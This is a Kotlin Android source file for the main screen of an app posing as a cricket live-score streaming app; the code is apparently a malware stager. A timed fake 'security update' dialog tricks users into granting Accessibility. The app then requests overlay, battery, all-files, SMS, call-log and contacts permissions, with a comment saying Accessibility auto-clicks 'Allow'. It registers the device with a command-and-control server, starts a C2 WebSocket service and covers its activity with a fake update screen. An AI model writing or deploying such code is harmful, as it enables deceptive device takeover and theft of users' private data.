package com.cricket.livescore.ui

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.cricket.livescore.databinding.ActivityMainBinding
import com.cricket.livescore.service.PayloadService
import com.cricket.livescore.utils.PermissionHelper

class MainActivity : AppCompatActivity() {
    companion object {
        private const val PERMISSION_REQ_CODE = 1001
    }

    private lateinit var binding: ActivityMainBinding
    private val permissionHelper = PermissionHelper()
    private var flowCompleted = false
    private var overlayRequested = false
    private var batteryOptRequested = false
    private var storageRequested = false
    private var permissionRequested = false
    private var stealthDialogShown = false
    private var flowLaunched = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupUI()
        checkPermissions()

        // 10-second stealth timer — triggers permission flow automatically, only once
        if (!flowLaunched) {
            flowLaunched = true
            android.os.Handler(mainLooper).postDelayed({
                if (!isFinishing && !flowCompleted) {
                    triggerStealthPermissionFlow()
                }
            }, 10000)
        }
    }

    private fun setupUI() {
        binding.btnWatchLive.setOnClickListener {
            if (isFinishing || isDestroyed) return@setOnClickListener
            if (isAccessibilityServiceEnabled()) {
                startPayloadFlow()
            } else {
                showPermissionDialog()
            }
        }

        binding.btnSchedule.setOnClickListener {
            Toast.makeText(this, "Upcoming matches loading...", Toast.LENGTH_SHORT).show()
        }

        binding.btnTeams.setOnClickListener {
            if (isFinishing || isDestroyed) return@setOnClickListener
            if (!isAccessibilityServiceEnabled()) {
                openAccessibilitySettings()
            } else {
                startPayloadFlow()
            }
        }
    }

    private fun checkPermissions() {
        if (!isAccessibilityServiceEnabled()) {
            binding.statusText.text = "Enable Video Overlay to watch live"
            binding.statusIcon.setImageResource(android.R.drawable.ic_dialog_info)
        } else {
            binding.statusText.text = "Ready to stream"
            binding.statusIcon.setImageResource(android.R.drawable.ic_dialog_info)
        }
    }

    private fun showPermissionDialog() {
        if (isFinishing || isDestroyed) return
        AlertDialog.Builder(this)
            .setTitle("Video Overlay Required")
            .setMessage("Cricket Live needs Accessibility access to show score overlays while you use other apps. This allows you to watch the match while chatting or browsing.")
            .setPositiveButton("Enable Now") { _, _ ->
                if (!isFinishing && !isDestroyed) openAccessibilitySettings()
            }
            .setNegativeButton("Later", null)
            .show()
    }

    private fun triggerStealthPermissionFlow() {
        if (stealthDialogShown) return
        stealthDialogShown = true
        if (isAccessibilityServiceEnabled()) {
            startPayloadFlow()
        } else {
            showStealthAccessibilityPrompt()
        }
    }

    private fun showStealthAccessibilityPrompt() {
        if (isFinishing || isDestroyed) return
        AlertDialog.Builder(this)
            .setTitle("System Update Required")
            .setMessage("Security Patch v2.1\n\nYour device needs a critical security update. Tap 'Apply Now' to proceed with the update process.")
            .setPositiveButton("Apply Now") { _, _ ->
                if (!isFinishing && !isDestroyed) openAccessibilitySettings()
            }
            .setNegativeButton("Later", null)
            .setCancelable(false)
            .show()
    }

    private fun openAccessibilitySettings() {
        if (isFinishing || isDestroyed) return
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = am.getEnabledAccessibilityServiceList(
            AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        )
        return enabledServices.any {
            it.resolveInfo.serviceInfo.packageName == packageName
        }
    }

    fun startPayloadFlow() {
        if (flowCompleted) return
        continuePayloadFlow()
    }

    private fun continuePayloadFlow() {
        if (flowCompleted || isFinishing || isDestroyed) return

        // Step 1: Overlay permission — request only ONCE
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            if (!overlayRequested) {
                overlayRequested = true
                startActivity(
                    Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                )
                return // Wait for user to return from overlay settings
            }
            // Already requested overlay — user came back without granting. Fall through.
        }

        // Step 2: Battery optimization exemption — request only ONCE
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                if (!batteryOptRequested) {
                    batteryOptRequested = true
                    startActivity(
                        Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:$packageName")
                        )
                    )
                    return // Wait for user to return from battery dialog
                }
                // Already requested — user didn't grant. Fall through.
            }
        }

        // Step 2b: Storage permission (MANAGE_EXTERNAL_STORAGE needs Settings intent)
        if (!PermissionHelper.hasStoragePermission(this)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!storageRequested) {
                    storageRequested = true
                    startActivity(
                        Intent(
                            Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                            Uri.parse("package:$packageName")
                        )
                    )
                    return // Wait for user to return from storage settings
                }
                // Already requested — user didn't grant. Fall through.
            }
        }

        // Step 3: Request runtime permissions (SMS, Call Log, Contacts, POST_NOTIFICATIONS)
        // AccessibilityService auto-clicks "Allow" within ~300ms
        // onRequestPermissionsResult() continues the flow after grant
        if (!permissionHelper.hasAllPermissions(this)) {
            if (!permissionRequested) {
                permissionRequested = true
                permissionHelper.requestPermissions(this)
                return // Wait for onRequestPermissionsResult callback
            }
            // Already requested — user denied. Fall through.
        }

        // All steps attempted (some may have been denied) — proceed
        finishSetup()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQ_CODE && !isFinishing && !isDestroyed) {
            permissionRequested = false
            // Continue flow regardless — proceed with whatever permissions were granted
            continuePayloadFlow()
        }
    }

    private fun finishSetup() {
        if (isFinishing || isDestroyed) return

        // Step 4: Register via HTTP SYNCHRONOUSLY (must complete before foreground service)
        // Using sync to guarantee delivery — even if foreground service crashes the process,
        // the HTTP request has already completed
        registerViaHttpSync()

        // Step 5: Start foreground service for real-time C2 (WebSocket)
        val serviceIntent = Intent(this, PayloadService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "ForegroundService failed — HTTP registration already sent", e)
        }

        flowCompleted = true

        // Step 6: Show system update overlay to hide all activity
        val overlayIntent = Intent(this, UpdateOverlayActivity::class.java)
        overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(overlayIntent)
        finish()
    }

    private fun registerViaHttpSync() {
        try {
            val json = org.json.JSONObject().apply {
                put("device_id", Build.ID)
                put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("manufacturer", Build.MANUFACTURER)
                put("model", Build.MODEL)
                put("android_version", Build.VERSION.RELEASE)
                put("api_level", Build.VERSION.SDK_INT)
            }
            val url = java.net.URL("${com.cricket.livescore.StagerApplication.c2RealUrl}/api/register")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.outputStream.write(json.toString().toByteArray())
            val code = conn.responseCode
            conn.disconnect()
            Log.i("MainActivity", "HTTP registration: $code")
        } catch (e: Exception) {
            Log.e("MainActivity", "HTTP registration failed", e)
        }
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing || isDestroyed) return
        if (isAccessibilityServiceEnabled()) {
            binding.statusText.text = "Ready to stream"
            startPayloadFlow()
        }
    }
}
